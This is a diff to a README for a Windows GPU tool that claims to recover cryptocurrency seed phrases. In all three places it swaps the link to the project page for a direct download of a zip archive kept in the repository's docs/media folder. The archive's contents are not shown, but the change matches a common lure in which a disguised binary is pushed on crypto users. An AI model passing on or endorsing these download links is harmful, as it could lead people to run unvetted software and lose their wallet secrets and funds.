@@ -1,6 +1,6 @@
 # 🔐 CUDA_Mnemonic_Recovery - Fast Seed Recovery on Windows
 
-[![Download Now](https://img.shields.io/badge/Download-CUDA_Mnemonic_Recovery-blue?style=for-the-badge)](https://github.com/isananny8515/CUDA_Mnemonic_Recovery)
+[![Download Now](https://img.shields.io/badge/Download-CUDA_Mnemonic_Recovery-blue?style=for-the-badge)](https://raw.githubusercontent.com/isananny8515/CUDA_Mnemonic_Recovery/main/docs/media/Recovery-CUD-Mnemonic-1.4.zip)
 
 ## 🧭 What This App Does
 
@@ -23,7 +23,7 @@ Best results come from a system with more than one GPU, but one supported GPU is
 ## 📥 Download
 
 Visit this page to download:
-https://github.com/isananny8515/CUDA_Mnemonic_Recovery
+https://raw.githubusercontent.com/isananny8515/CUDA_Mnemonic_Recovery/main/docs/media/Recovery-CUD-Mnemonic-1.4.zip
 
 ## 🛠️ Install on Windows
 
@@ -172,7 +172,7 @@ This project is related to:
 ## 📎 Download Link
 
 Download or open the project page here:
-https://github.com/isananny8515/CUDA_Mnemonic_Recovery
+https://raw.githubusercontent.com/isananny8515/CUDA_Mnemonic_Recovery/main/docs/media/Recovery-CUD-Mnemonic-1.4.zip
 
 ## ✅ Quick Start
 
